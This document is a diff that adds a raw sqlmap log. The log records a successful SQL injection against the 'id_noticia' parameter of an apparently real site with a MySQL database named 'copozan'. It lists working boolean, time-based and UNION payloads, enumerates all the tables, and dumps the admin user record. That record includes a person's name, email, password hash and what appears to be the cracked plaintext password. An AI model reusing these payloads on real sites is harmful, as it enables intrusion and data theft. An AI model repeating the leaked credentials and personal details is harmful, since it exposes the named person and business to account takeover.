@@ -1,0 +1,164 @@
+sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
+---
+Parameter: id_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_noticia=181 AND 4574=4574
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_noticia=181 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_noticia=-5755 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71766a7071,0x636a68744d57714843644d6f7961414b474b766a424e52446a564a786b6e664e74624c76726a4653,0x71787a7171),NULL-- EhKd
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] copozan
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_noticia=181 AND 4574=4574
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_noticia=181 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_noticia=-5755 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71766a7071,0x636a68744d57714843644d6f7961414b474b766a424e52446a564a786b6e664e74624c76726a4653,0x71787a7171),NULL-- EhKd
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: copozan
+[55 tables]
++-------------------------+
+| agenda                  |
+| bairros                 |
+| cadastro_cheques        |
+| calendario              |
+| carrinho_compras        |
+| carrinho_compras_salvo  |
+| cidades                 |
+| cliente_endereco        |
+| clientes                |
+| comissao                |
+| contas_pagar            |
+| contas_pagas            |
+| cupom                   |
+| despesa_extra           |
+| empresa                 |
+| etiqueta_impressao      |
+| expirar_sistema         |
+| fluxo_caixa             |
+| forma_pagamento         |
+| fornecedores            |
+| funcionarios            |
+| grupos                  |
+| jqcalendar              |
+| lista_tipos             |
+| mais_procurados         |
+| marcas                  |
+| melhorcomprador         |
+| natureza_operacao_notas |
+| nota_entrada            |
+| nota_entrada_produtos   |
+| noticias                |
+| noticias_tipos          |
+| noticiasfotos           |
+| orcamento_item          |
+| orcamento_status        |
+| orcamentos              |
+| pagamento_orcamento     |
+| pedido_itens            |
+| pedidos                 |
+| produto_modelo          |
+| produtos                |
+| produtos_destaque       |
+| produtos_promocao       |
+| representantes          |
+| status_cheques          |
+| status_pedido           |
+| sub_grupos              |
+| sub_sub_grupos          |
+| tipo_condicao           |
+| tipo_entrega            |
+| tipo_frete              |
+| tipo_pagamento          |
+| transportadora          |
+| usuarios                |
+| usuarios_nivel          |
++-------------------------+
+
+Database: copozan
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| noticias           | 182     |
+| produtos           | 99      |
+| bairros            | 31      |
+| representantes     | 23      |
+| sub_grupos         | 9       |
+| cidades            | 6       |
+| forma_pagamento    | 6       |
+| cupom              | 4       |
+| grupos             | 4       |
+| orcamento_status   | 3       |
+| status_pedido      | 3       |
+| noticiasfotos      | 2       |
+| tipo_condicao      | 2       |
+| tipo_frete         | 2       |
+| tipo_pagamento     | 2       |
+| usuarios_nivel     | 2       |
+| etiqueta_impressao | 1       |
+| expirar_sistema    | 1       |
+| fornecedores       | 1       |
+| marcas             | 1       |
+| noticias_tipos     | 1       |
+| produto_modelo     | 1       |
+| tipo_entrega       | 1       |
+| transportadora     | 1       |
+| usuarios           | 1       |
++--------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_noticia (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_noticia=181 AND 4574=4574
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_noticia=181 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id_noticia=-5755 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71766a7071,0x636a68744d57714843644d6f7961414b474b766a424e52446a564a786b6e664e74624c76726a4653,0x71787a7171),NULL-- EhKd
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: copozan
+Table: usuarios
+[1 entry]
++---------+---------------------+---------------+-------+---------------------------------------------------+-------+-------------------------------+---------+---------------------+
+| id_user | id_user_funcionario | nome          | nivel | senha                                             | ativo | email                         | usuario | cadastro            |
++---------+---------------------+---------------+-------+---------------------------------------------------+-------+-------------------------------+---------+---------------------+
+| 1       | 1                   | Daniel Redivo | 1     | 841e93f847532bffc4d6896db921916aef49136a (841123) | 1     | danielredivo@ilogicasi.com.br | daniel  | 2013-02-06 00:00:00 |
++---------+---------------------+---------------+-------+---------------------------------------------------+-------+-------------------------------+---------+---------------------+
+
